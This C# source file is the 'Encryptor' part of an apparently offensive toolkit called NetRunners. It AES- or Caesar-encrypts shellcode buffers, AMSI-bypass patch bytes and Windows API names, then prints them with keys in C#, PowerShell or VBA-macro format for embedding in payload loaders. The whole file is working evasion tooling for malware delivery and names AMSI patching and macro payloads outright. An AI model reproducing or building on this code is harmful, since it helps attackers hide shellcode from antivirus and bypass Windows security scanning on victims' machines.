using CommandLine;
using System;
using System.Text;
using static NetRunners.Encryptor.Printers.Printer;
using static NetRunners.Encryptor.Data.Data;
using static NetRunners.Encryptor.EncryptionAlgorithms.Encryptor;
using System.Collections.Generic;

namespace NetRunners.Encryptor
{
    // params
    public class Options
    {
        [Option('m', "macro", Required = false, HelpText = "Encrypted hellcode gets formated in decimal notation for use in VBA macro.")]
        public bool macro { get; set; }
        [Option('p', "powershell", Required = false, HelpText = "Print payload, aes key and iv in powershell format.")]
        public bool powershell { get; set; }
    }
    /// <summary>
    /// Entry point Encryptor, checks for arguments, prints decryption key and encrypted data.
    /// If no argument is supplied, program prints encrypted data + x86 shellcode in csharp format for use within netrunners.
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
                   .WithParsed<Options>(opts => RunWithOptions(opts))
                   .WithNotParsed<Options>((errs) => HandleParseError(errs));
        }
        static void RunWithOptions(Options opts) 
        {
            // generate keys and init buf
            byte[] encrypted;
            byte[] AesIV = GenerateIV_Aes();
            byte[] AesKey = GenerateKey_Aes();
            //byte[] XorKey = new byte[4];

            if (opts.macro)
            {
                // generate random caesar substitution key
                Random rnd = new Random();
                int CaesarKey = rnd.Next(101, 999);

                // print substitution key
                Console.WriteLine($"key = {CaesarKey}");

                // print x64 buf
                encrypted = EncryptBytesToBytes_Caesar(buf, CaesarKey);
                Console.Write($"buf = ");
                PrintBytesToDec(encrypted);

                // print x86 buf
                encrypted = EncryptBytesToBytes_Caesar(buf86, CaesarKey);
                Console.Write($"buf86 = ");
                PrintBytesToDec(encrypted);

                return;
            }
            else if (opts.powershell)
            {
                // print aes key
                Console.Write($"[Byte[]] $AesKey = ");
                PrintBytesToHexPs(AesKey);

                // print IV
                Console.Write($"[Byte[]] $AesIV = ");
                PrintBytesToHexPs(AesIV);

                // encrypt buf and print
                encrypted = EncryptBytesToBytes_Aes(buf, AesKey, AesIV);
                Console.Write("[Byte[]] $buf = ");
                PrintBytesToHexPs(encrypted);

                // encrypt buf86 and print
                encrypted = EncryptBytesToBytes_Aes(buf86, AesKey, AesIV);
                Console.Write("[Byte[]] $buf86 = ");
                PrintBytesToHexPs(encrypted);

                // encrypt amsipatch and print
                encrypted = EncryptBytesToBytes_Aes(AmsiPatch, AesKey, AesIV);
                Console.Write("[Byte[]] $AmsiPatch = ");
                PrintBytesToHexPs(encrypted);

                // encrypt amsipatch86 and print
                encrypted = EncryptBytesToBytes_Aes(AmsiPatch86, AesKey, AesIV);
                Console.Write("[Byte[]] $AmsiPatch86 = ");
                PrintBytesToHexPs(encrypted);

                // encrypt and print all api strings
                for (int i = 0; i < FunctionNames.Length; i++)
                {
                    byte[] FunctionNameBytes = Encoding.UTF8.GetBytes(FunctionNames[i]);
                    encrypted = EncryptBytesToBytes_Aes(FunctionNameBytes, AesKey, AesIV);
                    Console.Write($"[Byte[]] ${FunctionNames[i].Replace(".", "")}_Byte = ");
                    PrintBytesToHexPs(encrypted);
                }
                return;
            }
            else
            {
                // print aes key
                Console.Write($"public static byte[] AesKey = ");
                PrintBytesToHex(AesKey);

                // print IV
                Console.Write($"public static byte[] AesIV = ");
                PrintBytesToHex(AesIV);

                // encrypt buf and print
                encrypted = EncryptBytesToBytes_Aes(buf, AesKey, AesIV);
                Console.Write("public static byte[] buf = ");
                PrintBytesToHex(encrypted);

                // encrypt buf86 and print
                encrypted = EncryptBytesToBytes_Aes(buf86, AesKey, AesIV);
                Console.Write("public static byte[] buf86 = ");
                PrintBytesToHex(encrypted);

                // print decrypted buf size
                Console.Write($"public static int sBuf = ");
                Console.WriteLine($"{buf.Length};");

                // print decrypted buf86 size
                Console.Write($"public static int sBuf86 = ");
                Console.WriteLine($"{buf86.Length};");

                // encrypt amsipatch and print
                encrypted = EncryptBytesToBytes_Aes(AmsiPatch, AesKey, AesIV);
                Console.Write("public static byte[] AmsiPatch = ");
                PrintBytesToHex(encrypted);

                // encrypt amsipatch86 and print
                encrypted = EncryptBytesToBytes_Aes(AmsiPatch86, AesKey, AesIV);
                Console.Write("public static byte[] AmsiPatch86 = ");
                PrintBytesToHex(encrypted);

                // encrypt and print all strings
                for (int i = 0; i < FunctionNames.Length; i++)
                {
                    byte[] FunctionNameBytes = Encoding.UTF8.GetBytes(FunctionNames[i]);
                    encrypted = EncryptBytesToBytes_Aes(FunctionNameBytes, AesKey, AesIV);
                    Console.Write($"public static byte[] {FunctionNames[i].Replace(".", "")}_Byte = ");
                    PrintBytesToHex(encrypted);
                }
                return;
            }
        }
        static void HandleParseError(IEnumerable<Error> errs)
        {
            // Handle errors here
            Console.WriteLine("Error parsing command-line options.");
        }
    }
}
